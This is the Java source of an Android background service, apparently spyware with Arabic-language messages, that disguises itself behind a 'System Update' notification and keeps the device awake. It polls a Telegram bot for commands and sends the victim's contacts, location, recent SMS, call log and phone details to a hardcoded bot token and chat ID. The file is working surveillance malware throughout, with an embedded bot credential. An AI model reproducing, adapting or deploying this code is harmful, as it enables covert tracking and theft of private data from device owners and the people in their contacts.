package com.v8.global.sniffer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MainService extends Service {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private OkHttpClient client = new OkHttpClient();
    private PowerManager.WakeLock wakeLock;
    private Timer timer;
    private int lastUpdateId = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService:WakeLock");
        wakeLock.acquire();
        
        startForegroundService();
        
        sendMessage("✅ MainService Started - الجهاز تحت المراقبة");
        
        // فحص الأوامر كل 5 ثواني
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                checkCommands();
            }
        }, 0, 5000);
    }

    private void startForegroundService() {
        String channelId = "main_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "Main Service", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
        }
        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Update")
                .setContentText("يعمل في الخلفية...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build();
        startForeground(1, notification);
    }

    private void checkCommands() {
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + lastUpdateId + "&timeout=10")
                .build();
        
        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                try {
                    String body = response.body().string();
                    org.json.JSONObject json = new org.json.JSONObject(body);
                    org.json.JSONArray result = json.getJSONArray("result");
                    
                    for (int i = 0; i < result.length(); i++) {
                        org.json.JSONObject update = result.getJSONObject(i);
                        lastUpdateId = update.getInt("update_id") + 1;
                        
                        if (update.has("message")) {
                            org.json.JSONObject message = update.getJSONObject("message");
                            if (message.has("text")) {
                                String text = message.getString("text");
                                executeCommand(text);
                            }
                        }
                    }
                    response.close();
                } catch (Exception e) {}
            }
            @Override public void onFailure(Call call, IOException e) {}
        });
    }

    private void executeCommand(String command) {
        switch (command) {
            case "/help":
                sendHelp();
                break;
            case "/info":
                sendDeviceInfo();
                break;
            case "/contacts":
                getContacts();
                break;
            case "/location":
                getLocation();
                break;
            case "/sms":
                getSms();
                break;
            case "/calls":
                getCallLog();
                break;
            case "/status":
                sendMessage("✅ الخدمة تعمل\n" + new java.util.Date().toString());
                break;
        }
    }

    private void sendHelp() {
        String help = "📋 **الأوامر المتاحة**\n\n" +
                "/info - معلومات الجهاز\n" +
                "/contacts - جهات الاتصال\n" +
                "/location - الموقع الحالي\n" +
                "/sms - آخر 10 رسائل\n" +
                "/calls - آخر 10 مكالمات\n" +
                "/status - حالة الخدمة\n" +
                "/help - هذه القائمة";
        sendMessage(help);
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            info.put("battery", getBatteryLevel());
            
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                info.put("phone", tm.getLine1Number());
            }
            
            sendMessage("📱 **معلومات الجهاز**\n" + info.toString(2));
        } catch (Exception e) {}
    }

    private int getBatteryLevel() {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, ifilter);
        int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
        return (int)(level * 100 / (float)scale);
    }

    private void getContacts() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
                
                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);
                StringBuilder sb = new StringBuilder("📇 **جهات الاتصال**\n\n");
                int count = 0;
                while (cursor != null && cursor.moveToNext() && count < 50) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(": ").append(number).append("\n");
                    count++;
                }
                if (cursor != null) cursor.close();
                if (count == 0) sb.append("لا توجد جهات اتصال");
                sendMessage(sb.toString());
            } catch (Exception e) {
                sendMessage("❌ فشل سحب جهات الاتصال: " + e.getMessage());
            }
        }).start();
    }

    private void getLocation() {
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
            
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (location != null) {
                String map = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                sendMessage("📍 **الموقع**\nالخط: " + location.getLatitude() + "\nالطول: " + location.getLongitude() + "\n" + map);
            } else {
                sendMessage("📍 **الموقع** غير متوفر");
            }
        } catch (Exception e) {
            sendMessage("❌ فشل سحب الموقع");
        }
    }

    private void getSms() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return;
                
                Cursor cursor = getContentResolver().query(
                    android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("📨 **آخر 10 رسائل**\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    sb.append(address).append(": ").append(body).append("\n---\n");
                }
                if (cursor != null) cursor.close();
                if (sb.length() == 0) sb.append("لا توجد رسائل");
                sendMessage(sb.toString());
            } catch (Exception e) {
                sendMessage("❌ فشل سحب الرسائل");
            }
        }).start();
    }

    private void getCallLog() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
                
                Cursor cursor = getContentResolver().query(
                    android.net.Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("📞 **آخر 10 مكالمات**\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex("number"));
                    String type = cursor.getString(cursor.getColumnIndex("type"));
                    String duration = cursor.getString(cursor.getColumnIndex("duration"));
                    String typeText = type.equals("1") ? "وارد" : type.equals("2") ? "صادر" : "فائت";
                    sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("ث\n");
                }
                if (cursor != null) cursor.close();
                if (sb.length() == 0) sb.append("لا توجد مكالمات");
                sendMessage(sb.toString());
            } catch (Exception e) {
                sendMessage("❌ فشل سحب سجل المكالمات");
            }
        }).start();
    }

    private void sendMessage(String text) {
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                .post(new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build())
                .build();
        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override public void onResponse(Call call, Response response) { 
                try { response.close(); } catch (Exception e) {}
            }
            @Override public void onFailure(Call call, IOException e) {}
        });
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) timer.cancel();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
    }
}
